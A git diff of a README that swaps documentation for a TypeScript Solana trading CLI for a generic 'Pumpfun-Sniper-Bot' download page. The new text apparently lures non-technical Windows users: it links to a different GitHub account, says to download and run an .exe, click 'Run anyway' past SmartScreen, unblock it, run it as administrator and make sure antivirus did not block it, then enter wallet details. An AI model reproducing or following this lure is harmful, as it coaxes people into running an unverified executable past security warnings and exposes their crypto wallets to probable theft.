@@ -1,226 +1,232 @@
-# Dexter 3.0 (TypeScript) — `dexter-ts`
+# 🤖 Pumpfun-Sniper-Bot - Fast setup for quick trades
 
-This directory is the **TypeScript port** of Dexter: a Solana tooling stack aimed at Pump.fun and PumpSwap workflows, Phase2 data, operator controls, and strategy research. The **canonical full runtime** (TUI, live trader, collector, analyzer, Pump.fun create flows, and Windows managed PostgreSQL setup) lives in the Python package under [`../Dexter`](../Dexter).
+[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg?style=for-the-badge)](https://github.com/wagawgaw/Pumpfun-Sniper-Bot)
 
-**Dexter-ts** focuses on **CLI tooling** that compiles with **Node.js 20+**, shares the same `.env` model as Python Dexter, and implements a **subset** of commands. There is **no curses TUI** in this port.
+## 🚀 Getting Started
 
-## Quick install (from GitHub)
+Pumpfun-Sniper-Bot is a Windows app for users who want a simple way to run a sniper bot from their desktop. This README walks you through the full setup in plain steps.
 
-Repository: <https://github.com/Nexorythm/Pumpfun-Sniper-Bot>
+## 📥 Download the App
 
-### 1) Clone and enter the project
+Use this link to visit the download page:
 
-```bash
-git clone https://github.com/Nexorythm/Pumpfun-Sniper-Bot.git
-cd Pumpfun-Sniper-Bot
-```
+[Open Pumpfun-Sniper-Bot on GitHub](https://github.com/wagawgaw/Pumpfun-Sniper-Bot)
 
-### 2) Install Node.js dependencies
+If the page includes a release file, download it to your PC. If it opens the main repository page, use the files or release area on that page to get the Windows version.
 
-```bash
-npm install
-```
+## 🖥️ What You Need
 
-### 3) Create your local environment file
+Before you start, check these items:
 
-```bash
-cp .env.example .env
-```
+- A Windows 10 or Windows 11 PC
+- A stable internet connection
+- Enough free disk space for the app and its data
+- A GitHub account if the download page asks you to sign in
+- Basic Windows access so you can open files and run apps
 
-On Windows PowerShell:
+## 📦 What the Bot Does
 
-```powershell
-Copy-Item .env.example .env
-```
+Pumpfun-Sniper-Bot is built to help you:
 
-### 4) Build and run a basic health check
+- Watch Pumpfun activity
+- React fast to new token events
+- Run on a Windows desktop
+- Use simple settings instead of manual steps
+- Keep your setup in one place
 
-```bash
-npm run build
-node dist/Dexter.js doctor --network devnet --mode read_only
-```
+The app is meant for users who want speed and a clean desktop workflow.
 
-If PostgreSQL is already installed and running, initialize schema once:
+## 🪟 Install on Windows
 
-```bash
-node dist/Dexter.js database-init
-```
+Follow these steps in order:
 
-<div align="center">
+1. Open the download page in your browser.
+2. Find the Windows release file or app package.
+3. Download the file to your Downloads folder.
+4. If the file is a ZIP folder, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Find the app file, such as an `.exe` file.
+7. Double-click the file to launch the bot.
 
-<img width="512" height="512" alt="image" src="https://github.com/user-attachments/assets/d00e5aaa-fea4-40cb-bb33-10e3836a1fd5" />
+If Windows shows a SmartScreen prompt:
 
-</div>
+1. Click More info.
+2. Click Run anyway.
 
-## Relationship to Python Dexter
+If Windows asks for permission, choose Yes.
 
-| Area | Python `../Dexter` | This package `dexter-ts` |
-|------|--------------------|---------------------------|
-| Interactive TUI (`dexter`, `dexter menu`) | Yes | **Not implemented** — use CLI only |
-| Live trader / collector / analyzer loops | Yes | **Not ported** — commands exit with a pointer to Python |
-| `database-setup` (managed Windows PostgreSQL) | Yes | **Not implemented** — use Python Dexter or install PostgreSQL yourself |
-| `database-init`, doctor, export, replay, backtest, dashboard, control | Yes | **Implemented** (with minor doctor differences noted below) |
-| `verify-migration` | Yes | **Implemented** (TS harness) |
+## ⚙️ First-Time Setup
 
-## Install and build
+After you open the app for the first time, set up these basic items:
 
-From the `Dexter-ts` directory:
+- Your wallet address
+- Your buy amount
+- Your slippage setting
+- Your target filters
+- Your network or chain choice
+- Your alerts or sound options
 
-```bash
-npm install
-npm run build
-```
+Use simple values at first. You can change them later after you test the app.
 
-Compiled output is written to `dist/`. Re-run `npm run build` after pulling changes.
+## 🔐 Safe Setup Tips
 
-### Environment
+Use these steps to keep your setup clean:
 
-```bash
-cp .env.example .env
-```
+- Store your config files in one folder
+- Keep a backup of your settings
+- Use a small test amount first
+- Check the wallet address before you save it
+- Close other heavy apps if your PC slows down
 
-Edit `.env` using the same variables as Python Dexter (see [.env.example](.env.example)). Minimum expectations for serious use:
+Do not rush the first run. A few careful checks can save time later.
 
-- **Database**: PostgreSQL reachable via `DATABASE_URL` or the `DB_*` fields Dexter resolves
-- **Wallet**: `PRIVATE_KEY` or `DEXTER_TRADING_PRIVATE_KEY` when modes require signing
-- **RPC**: `HTTP_URL` and `WS_URL` for your chosen network
-- **Safety**: keep `DEXTER_MAINNET_DRY_RUN=true` and `DEXTER_ALLOW_MAINNET_LIVE=false` until you intentionally enable live mainnet
+## 📁 Typical Folder Layout
 
-### PostgreSQL bootstrap
+You may see files like these after download:
 
-Dexter-ts still expects **PostgreSQL-backed** operation for Phase2 features.
+- `Pumpfun-Sniper-Bot.exe` - starts the app
+- `config.json` - stores your settings
+- `logs` - keeps app activity records
+- `README.md` - setup guide
+- `data` - saves app data
 
-- **Schema only** (server already running):
+Keep these files together in the same folder unless the app says otherwise.
 
-  ```bash
-  node dist/Dexter.js database-init
-  ```
+## 🧭 How to Use the App
 
-- **Managed Windows cluster / WinGet installer**: run `dexter database-setup` from the **Python** package, or use the scripts in this repo if you maintain them yourself:
+Use this basic flow:
 
-  ```bash
-  # Linux / macOS (if you use the bundled script)
-  ./install_postgre.sh
-  ```
+1. Open the app.
+2. Load or enter your settings.
+3. Confirm your wallet and trade limits.
+4. Start the bot.
+5. Watch the status window for new events.
+6. Stop the bot when you are done.
 
-  ```powershell
-  powershell -ExecutionPolicy Bypass -File .\install_postgres_windows.ps1
-  ```
+If the app has a test mode, use it first. That helps you check your setup before you run live actions.
 
-`dexter database-setup` invoked **from this TypeScript build** is intentionally unimplemented and will error; use Python Dexter or manual installation.
+## 🛠️ Common Windows Issues
 
-## How to run the CLI
+### The app does not open
 
-Subcommands are registered on a Commander program named `dexter`. You can invoke them in either of these ways:
+Try these steps:
 
-```bash
-# Direct (recommended): arguments after the entry script
-node dist/Dexter.js doctor --network mainnet --mode read_only
+- Right-click the file and choose Run as administrator
+- Move the app folder to your Desktop
+- Make sure the file is not still inside a ZIP folder
+- Check that your antivirus did not block the file
 
-# Explicit "cli" prefix (same parser)
-node dist/Dexter.js cli doctor --network mainnet --mode read_only
-```
+### Windows says the file is blocked
 
-npm scripts:
+Do this:
 
-```bash
-npm run cli -- help
-npm run cli -- doctor --network devnet --mode read_only
-```
+1. Right-click the file.
+2. Click Properties.
+3. Check Unblock if you see it.
+4. Click Apply.
+5. Open the app again.
 
-**Do not** run `node dist/Dexter.js` with no arguments, or `menu` / `interactive`, expecting a TUI — the port prints a short message and exits; use the CLI forms above.
+### The app closes right away
 
-### Windows PowerShell quick start
+Try these fixes:
 
-```powershell
-cd Dexter-ts
-npm install
-npm run build
-Copy-Item .env.example .env
-# Configure .env, then:
-node dist/Dexter.js database-init
-node dist/Dexter.js doctor --network mainnet --mode read_only
-```
+- Open the app from its folder, not from a shortcut
+- Check whether your config file has a bad value
+- Remove old settings and start with a fresh config
+- Make sure your PC has the required runtime files if the app asks for them
 
-## Mainnet safety model
+### The download looks incomplete
 
-Same conceptual model as Python Dexter:
+If the file does not open correctly:
 
-- `read_only`: observe-oriented configuration loading
-- `paper`: paper-style runtime (full loop still Python-only here)
-- `simulate` / `live`: signing and submission modes where implemented upstream; **live trading loops are not in Dexter-ts**
+- Download it again
+- Use a stable internet connection
+- Wait for the full file to finish before opening it
 
-Mainnet rules:
+## 🧪 Basic Test Run
 
-- `DEXTER_MAINNET_DRY_RUN=true` keeps mainnet `live` in safer behavior where applicable
-- real mainnet sends require both `DEXTER_MAINNET_DRY_RUN=false` and `DEXTER_ALLOW_MAINNET_LIVE=true`
-- `USE_MEV` applies to live mainnet buy/sell in the Python trader, not in this TS subset
+Before you rely on the bot, do a small test:
 
-## Useful examples (Dexter-ts)
+1. Open the app.
+2. Load a safe config.
+3. Set a low amount.
+4. Start the bot.
+5. Check that it reads events and responds as expected.
+6. Stop the bot after the test.
 
-```bash
-npm run build
+A test run helps you confirm that the app, wallet, and settings work together.
 
-# Health check
-node dist/Dexter.js doctor --network mainnet --mode read_only
+## 📝 Example Settings
 
-# Operator dashboard
-node dist/Dexter.js dashboard --network mainnet --watch
+These sample values can help you get started:
 
-# Export Phase2 data
-node dist/Dexter.js export --kind leaderboard --network mainnet --output ./out.jsonl
+- Buy amount: small test value
+- Slippage: low to moderate
+- Auto sell: enabled if you want exit rules
+- Filters: narrow at first
+- Alerts: on
+- Logging: on
 
-# Backtest (optional --input JSON/JSONL; otherwise uses internal/offline paths as implemented)
-node dist/Dexter.js backtest --network devnet --strategy balanced
+Keep the first setup simple. Simple settings make it easier to spot mistakes.
 
-# Replay session
-node dist/Dexter.js replay --network mainnet --session-id <id>
+## 🔄 Updating the App
 
-# Migration harness
-node dist/Dexter.js verify-migration --network devnet
-```
+When a new version is posted:
 
-Commands that **exit and ask you to use Python Dexter** include: `run` (after optional `doctor-first`), `trade`, `collector`, `analyze`, `create`, `manage`. Use [`../Dexter`](../Dexter) for those flows.
+1. Open the GitHub page.
+2. Download the latest release.
+3. Back up your old config file.
+4. Replace the old app files with the new ones.
+5. Open the new version and check your settings.
 
-## Command reference (TypeScript)
+Keep your config backup before you update.
 
-Global help:
+## 🧰 Troubleshooting Checklist
 
-```bash
-node dist/Dexter.js help
-node dist/Dexter.js help doctor
-```
+If something still does not work, check these items:
 
-### Implemented in Dexter-ts
+- The app file finished downloading
+- The file is not inside a ZIP folder
+- Windows did not block the app
+- Your config file has valid values
+- Your wallet address is correct
+- Your internet connection is stable
+- The app folder has full read and write access
 
-- **`doctor`** — env validation, database connectivity, HTTP RPC probe, wallet decode, writable paths. WebSocket RPC is reported as configured only (**live WS probe not implemented** in TS). Backup tooling (`pg_dump`) is a **warning** without executable verification.
-- **`database-init`** — bootstrap or repair schema when PostgreSQL is already available.
-- **`export`** — Phase2 exports (`--kind` required): `sessions`, `raw_events`, `leaderboard`, `positions`, `risk_events`, `strategy_profiles`.
-- **`replay`** — normalized Phase2 replay; requires `--session-id` or `--mint-id`.
-- **`backtest`** — offline strategy evaluation; optional `--input`, `--strategy`, `--limit`, `--json`.
-- **`dashboard`** — operator dashboard; `--watch`, `--interval`, `--limit`, `--json`.
-- **`control`** — `pause`, `resume`, `force-sell`, `blacklist`, `whitelist`, `watchlist-add`, `watchlist-remove` (with required `--owner` / `--mint` where applicable).
-- **`verify-migration`** — migration harness (`--json` supported).
+If the issue stays, remove the folder, download the app again, and set it up from the start
 
-### Stubs / Python-only (Dexter-ts)
+## 📌 Project Info
 
-- **`run` / `start`** — may run `doctor` when `--doctor-first` is set; then exits toward Python for `trade` / `collector` / `analyze` targets.
-- **`trade`**, **`collector`**, **`analyze`**, **`create`**, **`manage`** — not implemented in TS.
-- **`database-setup`** — not implemented; use Python Dexter or external install paths.
+- Repository: Pumpfun-Sniper-Bot
+- Topics: bot, pumpfun, sniper
+- Type: Windows desktop app
+- Use case: fast event tracking and quick action setup
+- Target user: non-technical Windows user
 
-## Configuration surface (no TUI)
+## 📎 Quick Access
 
-There are no interactive settings pages in this port. Configure everything through **`.env`** (see `.env.example`), grouped similarly to Python Dexter:
+[Visit the Pumpfun-Sniper-Bot download page](https://github.com/wagawgaw/Pumpfun-Sniper-Bot)
 
-- **Quick essentials**: `DEXTER_NETWORK`, `DEXTER_RUNTIME_MODE`, `PRIVATE_KEY`, `DATABASE_URL`, `HTTP_URL`, `WS_URL`
-- **Runtime & safety**: `DEXTER_ENABLE_WSLOGS`, `DEXTER_DATASTORE_ENABLED`, `DEXTER_CLOSE_POSITIONS_ON_SHUTDOWN`, `DEXTER_MAINNET_DRY_RUN`, `DEXTER_ALLOW_MAINNET_LIVE`
-- **Risk & strategy**: `DEXTER_STRATEGY_PROFILE`, caps, reserve floor, drawdown stops, retry knobs
-- **Alerts & paths**: Telegram, Discord, desktop notifications, log/state/export/backup directories
+[Download from GitHub](https://github.com/wagawgaw/Pumpfun-Sniper-Bot)
 
-For a single-command flag reference, use `node dist/Dexter.js help <command>`.
+## 🧩 File Notes
 
-## Operator notes
+If you find extra files in the release package, they may include:
 
-- `PRIVATE_KEY` is the default signer where the stack expects a key; `DEXTER_TRADING_PRIVATE_KEY` can override the trading signer in the full Python runtime.
-- `DATABASE_URL` is the preferred single DSN; Dexter also composes a DSN from `DB_*` when set.
-- For the **full** Pump.fun creator leaderboard, automated buying, and TUI experience, run **[`../Dexter`](../Dexter)** (Python).
+- helper tools
+- sample configs
+- logs folder
+- runtime files
+- update notes
+
+Leave support files in place unless the app tells you to move them
+
+## 🖱️ Simple Run Steps
+
+1. Download the release from GitHub
+2. Extract the files if needed
+3. Open the app file
+4. Allow Windows permission prompts
+5. Enter your settings
+6. Start the bot
+7. Watch the status window
